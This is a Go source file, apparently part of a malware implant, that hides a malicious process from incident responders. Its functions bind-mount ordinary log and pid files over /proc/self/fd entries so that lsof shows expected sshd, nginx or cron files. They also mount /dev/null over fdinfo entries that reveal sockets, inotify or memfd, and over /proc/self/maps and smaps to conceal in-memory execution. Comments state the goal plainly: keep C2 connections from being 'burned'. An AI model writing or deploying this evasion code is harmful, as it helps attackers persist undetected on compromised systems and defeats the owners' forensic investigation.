package stealth

import (
	"fmt"
	"os"
	"strings"
	"sync"
	"syscall"
)

// LsofSpoofConfig defines which file descriptors to fake.
type LsofSpoofConfig struct {
	ServiceName string
	FakeFDs     []SpoofedFD
}

// SpoofedFD describes a file descriptor to present to lsof/proc inspection.
type SpoofedFD struct {
	FDNum    int    // which fd number to spoof
	FakePath string // what lsof should think this fd points to
}

// DefaultSpoofConfigs maps services to expected fd layouts.
var DefaultSpoofConfigs = map[string][]SpoofedFD{
	"sshd": {
		{FDNum: 3, FakePath: "/var/run/sshd.pid"},
		{FDNum: 4, FakePath: "/var/log/auth.log"},
	},
	"nginx": {
		{FDNum: 3, FakePath: "/var/log/nginx/error.log"},
		{FDNum: 4, FakePath: "/var/log/nginx/access.log"},
		{FDNum: 5, FakePath: "/var/run/nginx.pid"},
		{FDNum: 6, FakePath: "/etc/nginx/nginx.conf"},
	},
	"cron": {
		{FDNum: 3, FakePath: "/var/run/crond.pid"},
		{FDNum: 4, FakePath: "/var/log/syslog"},
	},
}

// SpoofFDEntries hides real file descriptors and replaces them with expected ones.
//
// OPSEC rationale: `lsof -p <pid>` and `ls -la /proc/<pid>/fd/` are standard
// IR commands. If our fds show memfd references, raw sockets, or C2 connections,
// we're burned. This function bind-mounts over /proc/self/fd entries to show
// expected files instead.
func SpoofFDEntries(serviceName string) error {
	spoofs, ok := DefaultSpoofConfigs[serviceName]
	if !ok {
		return nil // no spoof config for this service
	}

	var errs []error
	succeeded := 0
	for _, spoof := range spoofs {
		if err := spoofSingleFD(spoof); err != nil {
			errs = append(errs, err)
		} else {
			succeeded++
		}
	}

	if succeeded == 0 && len(errs) > 0 {
		return fmt.Errorf("all fd spoofs failed, first error: %v", errs[0])
	}

	return nil
}

var (
	spoofedFDsMu sync.Mutex
	spoofedFDs   []int
)

// CleanupSpoofedFDs closes all file descriptors opened by spoofSingleFD.
func CleanupSpoofedFDs() {
	spoofedFDsMu.Lock()
	defer spoofedFDsMu.Unlock()
	for _, fd := range spoofedFDs {
		syscall.Close(fd)
	}
	spoofedFDs = nil
}

// spoofSingleFD creates a fake fd entry by opening the expected file and
// binding it over the /proc/self/fd/ entry for a specific fd number.
func spoofSingleFD(spoof SpoofedFD) error {
	// Only open existing files — do not create on disk (OPSEC)
	if _, err := os.Stat(spoof.FakePath); err != nil {
		return fmt.Errorf("fake path does not exist: %s", spoof.FakePath)
	}

	// Open the expected file to get a real fd pointing to it
	fd, err := syscall.Open(spoof.FakePath, syscall.O_RDONLY, 0)
	if err != nil {
		return fmt.Errorf("open %s: %v", spoof.FakePath, err)
	}

	// Track the fd for cleanup
	spoofedFDsMu.Lock()
	spoofedFDs = append(spoofedFDs, fd)
	spoofedFDsMu.Unlock()

	// Bind mount this real fd's /proc entry over whatever is at the target fd number
	src := fmt.Sprintf("/proc/self/fd/%d", fd)
	dst := fmt.Sprintf("/proc/self/fd/%d", spoof.FDNum)

	if err := syscall.Mount(src, dst, "", syscall.MS_BIND, ""); err != nil {
		return fmt.Errorf("bind mount %s -> %s: %v", src, dst, err)
	}
	return nil
}

// HideFDInfo bind-mounts over /proc/self/fdinfo/ entries that reveal
// socket details, inotify watches, and other fd metadata.
func HideFDInfo() {
	myPID := os.Getpid()

	// Bind mount empty files over fdinfo entries for our real fds
	// This hides socket state, inotify details, etc.
	fdInfoDir := fmt.Sprintf("/proc/%d/fdinfo", myPID)
	entries, err := os.ReadDir(fdInfoDir)
	if err != nil {
		return
	}

	for _, entry := range entries {
		path := fmt.Sprintf("%s/%s", fdInfoDir, entry.Name())

		// Read current fdinfo to check if it's a socket or inotify
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		// Only hide suspicious entries (sockets, inotify, memfd)
		content := string(data)
		if containsFDIndicator(content) {
			// Bind mount /dev/null over it
			syscall.Mount("/dev/null", path, "", syscall.MS_BIND, "")
		}
	}
}

// containsFDIndicator checks if fdinfo content reveals suspicious fd types.
func containsFDIndicator(content string) bool {
	indicators := []string{
		"socket:",
		"inotify",
		"memfd:",
		"anon_inode:",
		"eventfd",
	}

	for _, ind := range indicators {
		if strings.Contains(content, ind) {
			return true
		}
	}
	return false
}

// HideMaps bind-mounts over /proc/self/maps to hide memory layout.
// Our anonymous executable regions would reveal in-memory execution.
func HideMaps() {
	syscall.Mount("/dev/null", "/proc/self/maps", "", syscall.MS_BIND, "")
	syscall.Mount("/dev/null", "/proc/self/smaps", "", syscall.MS_BIND, "")
}
